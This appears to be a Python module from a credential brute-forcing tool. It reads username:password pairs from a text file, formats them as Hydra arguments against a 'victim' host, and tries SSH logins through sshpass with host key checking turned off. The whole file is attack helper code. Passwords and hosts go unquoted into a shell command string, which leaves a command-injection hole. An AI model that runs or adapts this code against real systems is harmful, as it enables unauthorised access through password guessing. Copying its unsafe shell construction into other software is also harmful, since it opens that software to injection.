from scanner.shell import shell


class looper:
    """
    looper that loops
    """

    def __init__(self, list, split=False):
        self.list = list
        self.split = split

    def loop(self):
        """
        loop over txt file as usr:pwd source
        :return:
        """
        _4rr4y = []
        with open(self.list, 'r') as list:
            for l in list:
                spl = l.split(":")
                if self.split:
                    _4rr4y.append(spl)
                else:
                    _4rr4y.append(l)

        return _4rr4y


class format:
    """
    return usr:pwd couple Hydra compatible
    """

    def __init__(self, victim, port, usr, pwd):
        self.victim = victim
        self.usr = usr
        self.pwd = pwd
        self.port = port

    def format(self):
        """
        return formatted
        :return: str
        """
        form = "-v {} -P {} -u {} -p {}".format(self.victim.rstrip(), self.port.rstrip(), self.usr.rstrip(),
                                                self.pwd.rstrip())
        return form


class cnx:
    def __init__(self, ip, port, usr, password, protocol):
        self.ip = ip
        self.port = port
        self.usr = usr
        self.password = password
        self.protocol = protocol

    def connect(self):
        if self.protocol == "ssh":
            s = shell().execom(
                "sshpass -p {} ssh -q -o ConnectTimeout=3 -o StrictHostKeyChecking=no {}@{} -p {}".format(
                    self.password.rstrip(), self.usr.rstrip(), self.ip.rstrip(), self.port.rstrip()))
            print(s)

